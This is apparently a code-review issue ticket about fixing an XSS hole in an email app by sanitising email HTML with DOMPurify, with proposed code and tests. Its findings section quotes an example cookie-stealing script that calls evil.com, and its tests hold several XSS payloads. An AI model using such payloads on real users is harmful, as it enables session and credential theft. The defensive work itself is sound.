---
status: pending
priority: p1
issue_id: code-review-plan-2026-01-11
tags: [security, code-review, xss, html-sanitization]
dependencies: []
created: 2026-01-11
---

# Sanitize Email HTML to Prevent XSS Attacks

## Problem Statement

**What's broken:** Email HTML content from Nylas API is converted to plain text and displayed in UI without sanitization. Malicious HTML in emails can execute JavaScript in user's browser.

**Why it matters:** An attacker who can send emails to the user can:
- Steal session tokens/credentials
- Perform actions as the user
- Exfiltrate email content
- Redirect to phishing sites

**Current State:** Plan proposes html-to-text conversion but doesn't mention XSS protection. Existing todo #003 already identified XSS in ThreadDetail.tsx.

**Evidence:** Security audit + pattern recognition agent both flagged this.

## Findings

**From Security Sentinel Agent:**

```
XSS Attack Vector:
1. Attacker sends email with malicious HTML:
   <script>fetch('https://evil.com/steal?token='+document.cookie)</script>
   <img src=x onerror="alert('XSS')">

2. User generates draft reply → email HTML fetched
3. Plan's html-to-text conversion strips tags BUT...
4. If any rendering step uses dangerouslySetInnerHTML → XSS

Current Code (ThreadDetail.tsx):
<div dangerouslySetInnerHTML={{ __html: draftBody }} />
```

**Impact:**
- Confidentiality: HIGH (token theft)
- Integrity: HIGH (session hijacking)
- Availability: MEDIUM (phishing redirects)

**OWASP Category:** A03:2021 - Injection (XSS variant)

## Proposed Solutions

### Solution 1: DOMPurify + html-to-text (Recommended)

**Approach:**
1. Sanitize HTML with DOMPurify BEFORE conversion
2. Then convert to plain text with html-to-text
3. Render plain text safely (no dangerouslySetInnerHTML)

**Pros:**
- Industry-standard sanitization
- Works for HTML AND plain text output
- Prevents all known XSS vectors
- Lightweight (14KB gzipped)

**Cons:**
- Adds dependency
- Requires isomorphic version for SSR

**Effort:** 2-3 hours
**Risk:** LOW - battle-tested library

**Implementation:**
```typescript
// lib/sanitization/html-sanitizer.ts
import DOMPurify from 'isomorphic-dompurify';
import { convert } from 'html-to-text';

export function safeHtmlToPlainText(html: string): string {
  // Step 1: Sanitize HTML (removes scripts, event handlers)
  const cleanHtml = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [], // Strip ALL tags (we want plain text)
    KEEP_CONTENT: true, // Keep text content
    ALLOWED_ATTR: [], // No attributes
  });

  // Step 2: Convert to plain text
  const plainText = convert(cleanHtml, {
    wordwrap: 80,
    preserveNewlines: true,
  });

  return plainText;
}

// For displaying quoted history
export function sanitizeForDisplay(content: string): string {
  // Already plain text, but escape HTML entities just in case
  return content
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}
```

**Usage in formatter:**
```typescript
// lib/format-thread-history.ts
import { safeHtmlToPlainText } from './sanitization/html-sanitizer';

function formatSingleMessage(msg: Message): string {
  // Sanitize BEFORE conversion
  const plainBody = safeHtmlToPlainText(msg.body);

  const quotedLines = plainBody
    .split('\n')
    .map(line => `> ${line}`)
    .join('\n');

  return `${header}\n${quotedLines}`;
}
```

**Usage in component:**
```typescript
// app/inbox/ThreadDetail.tsx
import { sanitizeForDisplay } from '@/lib/sanitization/html-sanitizer';

// SAFE: No dangerouslySetInnerHTML needed
<div className="whitespace-pre-wrap">
  {sanitizeForDisplay(draftBody)}
</div>
```

### Solution 2: React Built-in Escaping (Simpler)

**Approach:**
1. Convert HTML to plain text (no sanitization needed if we trust conversion)
2. Render as plain text in React (automatic escaping)
3. Never use dangerouslySetInnerHTML

**Pros:**
- No dependencies
- Simple implementation
- React escapes by default

**Cons:**
- Relies on html-to-text being bulletproof
- No defense against conversion bugs
- Less defense-in-depth

**Effort:** 1 hour
**Risk:** MEDIUM - single point of failure

**Implementation:**
```typescript
// lib/format-thread-history.ts
function formatSingleMessage(msg: Message): string {
  // Trust html-to-text to handle malicious HTML
  const plainBody = convert(msg.body, {
    wordwrap: 80,
    preserveNewlines: true,
  });

  // React will escape this automatically
  return plainBody;
}

// Component
<div className="whitespace-pre-wrap">
  {draftBody /* React auto-escapes */}
</div>
```

### Solution 3: Nylas Clean Endpoint (Already Using?)

**Approach:**
1. Use Nylas `/messages/clean` endpoint (already in use per architecture review)
2. This returns markdown instead of HTML
3. Markdown is safer than HTML

**Pros:**
- Already implemented (page.tsx line 52)
- Server-side conversion
- One less dependency

**Cons:**
- Still need to sanitize markdown (can contain HTML)
- Doesn't prevent XSS if Nylas is compromised

**Effort:** 0 hours (verify existing usage)
**Risk:** LOW - if combined with Solution 2

**Verification:**
```typescript
// Check if already using clean endpoint
const res = await fetch(
  `https://api.us.nylas.com/v3/grants/${grantId}/messages/clean`,
  {
    body: JSON.stringify({
      message_id: messageIds,
      html_as_markdown: true,  // Returns markdown not HTML ✅
    })
  }
);
```

## Recommended Action

**Defense in Depth: Combine Solutions 1 & 3**

1. **Verify Nylas clean endpoint** (already used)
   - Confirms markdown output
   - Server-side conversion

2. **Add DOMPurify sanitization** (new)
   - Belt-and-suspenders approach
   - Protects against Nylas bugs
   - Required by security standard

3. **Never use dangerouslySetInnerHTML**
   - Remove from ThreadDetail.tsx
   - Use React's default escaping

**Timeline:**
- Day 1: Install DOMPurify (30 min)
- Day 1: Add sanitization to formatter (1 hour)
- Day 1: Remove dangerouslySetInnerHTML (30 min)
- Day 2: Add XSS test cases (2 hours)

## Technical Details

**Affected Files:**
- `/email-workflow/lib/format-thread-history.ts` (add sanitization)
- `/email-workflow/lib/sanitization/html-sanitizer.ts` (new)
- `/email-workflow/app/inbox/ThreadDetail.tsx` (remove dangerouslySetInnerHTML)

**Dependencies:**
```json
{
  "dependencies": {
    "isomorphic-dompurify": "^2.14.0"
  }
}
```

**Test Cases:**
```typescript
describe('XSS Prevention', () => {
  it('removes script tags', () => {
    const malicious = '<script>alert("XSS")</script>Hello';
    const safe = safeHtmlToPlainText(malicious);
    expect(safe).toBe('Hello');
    expect(safe).not.toContain('<script>');
  });

  it('removes event handlers', () => {
    const malicious = '<img src=x onerror="alert(1)">';
    const safe = safeHtmlToPlainText(malicious);
    expect(safe).not.toContain('onerror');
  });

  it('removes javascript: URLs', () => {
    const malicious = '<a href="javascript:alert(1)">Click</a>';
    const safe = safeHtmlToPlainText(malicious);
    expect(safe).toContain('Click');
    expect(safe).not.toContain('javascript:');
  });

  it('preserves text content', () => {
    const html = '<p>Hello <b>World</b></p>';
    const safe = safeHtmlToPlainText(html);
    expect(safe).toBe('Hello World');
  });

  it('handles nested attack vectors', () => {
    const malicious = '<div><script>alert(1)</script><p onclick="hack()">Text</p></div>';
    const safe = safeHtmlToPlainText(malicious);
    expect(safe).toBe('Text');
  });
});
```

**Configuration:**
```typescript
// DOMPurify config for email content
export const EMAIL_SANITIZE_CONFIG = {
  ALLOWED_TAGS: [], // Strip all HTML tags
  KEEP_CONTENT: true, // Keep text
  ALLOWED_ATTR: [], // No attributes
  ALLOW_DATA_ATTR: false,
  FORBID_TAGS: ['style', 'script', 'iframe'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick'],
};
```

## Acceptance Criteria

- [ ] DOMPurify installed and configured
- [ ] All email HTML sanitized before rendering
- [ ] No usage of dangerouslySetInnerHTML in email components
- [ ] XSS test suite passes (5+ attack vectors)
- [ ] Manual penetration test with known XSS payloads
- [ ] Security audit shows "XSS Prevention: PASS"
- [ ] Plain text emails render correctly (no garbled content)
- [ ] Rich HTML emails render as readable plain text

## Work Log

### 2026-01-11 - Initial Finding
**Action:** Security review identified XSS risk in email rendering
**Status:** Documented as P1 blocker (relates to existing todo #003)
**Next:** Install DOMPurify and implement sanitization

## Resources

- **Related PRs/Issues:** Todo #003 (existing XSS vulnerability)
- **Documentation:**
  - [DOMPurify GitHub](https://github.com/cure53/DOMPurify)
  - [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
  - [React: dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
- **Security Audit:** `/plans/2026-01-11-security-audit-email-reply-enhancement.md`
- **Similar Patterns:** Existing sanitization in conversation.ts (lines 120-130)
